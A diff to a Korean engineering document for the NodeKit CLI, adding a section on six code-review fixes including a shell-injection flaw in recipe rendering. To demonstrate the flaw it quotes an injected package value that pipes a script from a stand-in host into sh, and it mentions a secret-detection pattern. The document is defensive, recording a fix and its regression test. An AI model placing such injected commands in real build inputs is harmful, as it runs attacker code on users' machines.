@@ -1,6 +1,6 @@
 # NodeKit ↔ NodeVault 로컬 gRPC 통합 테스트 시나리오
 
-Status: 실행 완료 — 버그 20건 발견(#5~#20), 전부 수정·머지 완료
+Status: 실행 완료 — 버그 26건 발견(#5~#26), 전부 수정·머지 완료
 Created: 2026-07-04
 Updated: 2026-07-07
 Scope: heain 개발 장비에서 seoy/K8s 없이 `nodekit submit` 전체 경로를 검증
@@ -488,3 +488,90 @@ DockGuard 원본의 비밀 패턴 정규식(`\b(PASSWORD|SECRET|API_KEY|TOKEN|PA
   .SupportsMultilineInput` + `PromptMultilineScalarField`로 해결. 빈 줄로
   종료되는 여러 줄 입력을 지원하며, 기존 EOF-vs-빈줄 안전 패턴(#10/#11/#12)을
   그대로 재사용. 회귀 테스트: `DockerfileContent_StdinEndsMidMultilineInput_CancelsInsteadOfLooping`.
+
+## 9. 외부 코드 리뷰 반영 (#21~#26)
+
+사용자가 외부에서 받은 코드 리뷰 6건을 전달했고, 각 지적을 실제 코드를 직접
+읽어 사실 확인한 뒤 우선순위(High → Medium-High → Medium → Low) 순으로 전부
+수정했다.
+
+| 우선순위 | 대상 | 결과 |
+|---|---|---|
+| High | `RecipeRenderer`의 shell injection | **버그 확인**: Packages/Channels/PackageMirrorUri/SourceUri가 셸 인용 없이 그대로 RUN/curl 라인에 붙음 → Issue #21 |
+| Medium-High | validate/render/submit이 BuildKind 누락 시 크래시 | **버그 확인**: `RecipeValidationPipeline.ValidateRecipe`의 `InvalidOperationException`이 CLI 경계에서 안 잡힘 → Issue #22 |
+| Medium | `ci-audit-packages.sh`가 NodeKit.Cli/.Cli.Tests를 감사에서 누락 | **버그 확인**: 하드코딩된 2개 csproj만 순회 → Issue #23 |
+| Medium | 전체 커버리지 기준(line 14%/branch 9%)의 회귀 방어력이 약함 | **개선**: 핵심 클래스 5개에 별도 상한선 추가 → Issue #24 |
+| Low-Medium | `SubmitCommand`의 `Console.CancelKeyPress` 핸들러 미해제 | **버그 확인** → Issue #25 |
+| Low | `AppSettings` 기본값이 실험실 내부 IP로 하드코딩 | **버그 확인** → Issue #26 |
+
+### Issue #21 — Package/Micromamba/Mirror/Source 방식에서 shell injection 가능
+
+`RecipeRenderer.RenderInstallerFamily`/`RenderSourceBuild`는 Packages/Channels/
+PackageMirrorUri/SourceUri를 셸 인용 없이 그대로 `RUN`/`curl` 라인에 이어
+붙인다. `PackageVersionValidator`는 "버전이 있는가"만 보고 셸 메타문자를
+막지 않아서, `bwa=0.7.17 && curl evil.sh | sh` 같은 패키지 항목이
+L1-PKG-001(버전 고정 검사)만 통과하면 뒤에 붙은 임의 명령은 아무 검사도
+받지 않았다 — 뒤 명령이 conda/pip install 패턴에 안 걸리므로 스캔 대상에서
+아예 빠지기 때문이다. Package/Mirror/Source 방식이 dockerfile fallback보다
+안전한 UX여야 한다는 설계 의도를 정면으로 깼다.
+
+`RecipeValidator.cs`에 렌더링 전 allowlist 검증을 추가해 수정:
+- Packages(L1-RCP-011): `name=version[=build]` 형식만 허용
+- Channels/PackageMirrorUri(L1-RCP-012/013): 셸 메타문자 없는 charset만 허용
+- SourceUri(L1-RCP-014): http(s) 스킴 강제 + 큰따옴표/작은따옴표/백틱/`$`/
+  백슬래시/공백(개행 포함) 차단 — `RenderSourceBuild`가 SourceUri를
+  큰따옴표로 감싸 붙이므로 그 인용을 깨는 문자만 정확히 겨냥했다.
+
+SourceBuildCommands는 의도적으로 allowlist 대상에서 제외했다 — 이 필드의
+목적 자체가 `./configure && make`처럼 셸 빌드 단계를 그대로 실행하는
+것이라, 셸 메타문자를 막으면 기능이 깨진다.
+
+실제 CLI 바이너리로 리뷰의 정확한 예시(`bwa=0.7.17 && curl evil.sh | sh`)를
+`nodekit validate`에 넣어 재현: L1-RCP-011로 차단 확인.
+
+### Issue #22 — BuildKind 없는 외부 recipe.json이 CLI를 크래시시킴
+
+`RecipeValidationPipeline.ValidateRecipe()`는 BuildKind가 null이면
+`InvalidOperationException`을 던진다 — 대화형 authoring 세션 전용 내부
+계약(`RecipeBuildKindResolver.Resolve()` 이후에만 호출된다는 전제)이다.
+`CliApp.cs`(validate/render)와 `SubmitCommand.cs`는 이 호출을 어떤
+try/catch로도 감싸지 않아서, "buildKind" 필드를 빠뜨린 손으로 작성한
+recipe.json을 넣으면 스택트레이스와 함께 죽었다. 실제 CLI 바이너리로
+재현 확인.
+
+`CliApp.TryLoadRecipe()`와 `SubmitCommand.Run()`에 BuildKind null 체크를
+추가해 CLI 경계에서 먼저 막도록 수정 — 사용 가능한 BuildKind 값을 안내하는
+메시지와 함께 exit code 2를 반환한다.
+
+### Issue #23~#26 — CI 스크립트/사소한 위생 문제 4건
+
+- **#23**: `ci-audit-packages.sh`가 `NodeKit.csproj`/`NodeKit.Tests`만
+  하드코딩으로 순회해 `src/NodeKit.Cli`/`NodeKit.Cli.Tests`가 NuGet 취약점
+  감사에서 빠졌다 → `find . -name '*.csproj'` 기반 자동 탐색으로 교체.
+- **#24**: 전체 커버리지 기준(line 14%/branch 9%)은 가드레일이라 부르기엔
+  너무 낮다 → 전체 기준은 유지하되, `RecipeValidationPipeline`/
+  `RecipeRenderer`/`SubmitCommand`/`GrpcToolSpecClient`/
+  `HarborImageDigestResolver` 5개 핵심 클래스에 대해 cobertura XML에서
+  클래스별 line-rate/branch-rate를 직접 추출해 검사하는 별도의 더 높은
+  기준(line ≥70%, branch ≥50%)을 추가했다. 실측 커버리지(`GrpcToolSpecClient`
+  branch-rate 0.5555가 가장 낮음)에 약간의 여유를 둔 값이며, 이 클래스의
+  낮은 branch coverage가 현재 병목임을 스크립트 주석에 남겼다.
+- **#25**: `SubmitCommand.SubmitAsync`가 등록한 `Console.CancelKeyPress`
+  람다 핸들러를 제거하지 않았다 — `ConsoleCancelKeyCancellationSource`의
+  기존 `Dispose` 패턴과 동일하게 명명된 델리게이트 + `finally`에서 `-=`로
+  수정.
+- **#26**: `AppSettings`의 `NodeVaultAddress`/`CatalogAddress` 기본값이
+  실험실 내부 IP(`100.123.80.48`)로 하드코딩되어 있었다 — `MainWindow
+  .axaml.cs`의 5개 호출 지점 모두 이미 `string.IsNullOrEmpty(address)`
+  가드로 "설정 안 됨" 상태를 안전하게 처리하고 있어(⚙ 설정 화면 유도), 빈
+  문자열 기본값으로 바꿔도 동작 변화가 없음을 확인한 뒤 수정.
+
+### 완료한 것 / 완료하지 않은 것 (§9)
+
+- **완료**: 6건 전부 수정. 회귀 테스트 9개 추가(`RecipeValidatorTests` 6개,
+  `CliAppTests` 2개, `SubmitCommandTests` 1개), `dotnet build` 0 warning,
+  전체 테스트 521개 통과(신규 포함, 스킵 2개는 기존 opt-in 통합 테스트).
+  실제 `nodekit` CLI 바이너리로 shell injection 시나리오와 BuildKind 누락
+  시나리오 둘 다 수정 전/후 차이를 직접 재현해 확인했다. GitHub 이슈
+  #21~#26 등록 후 커밋 참조와 함께 각각 close 완료.
+- **완료 아님**: 없음 — 6건 모두 이번 턴에서 끝까지 처리했다.
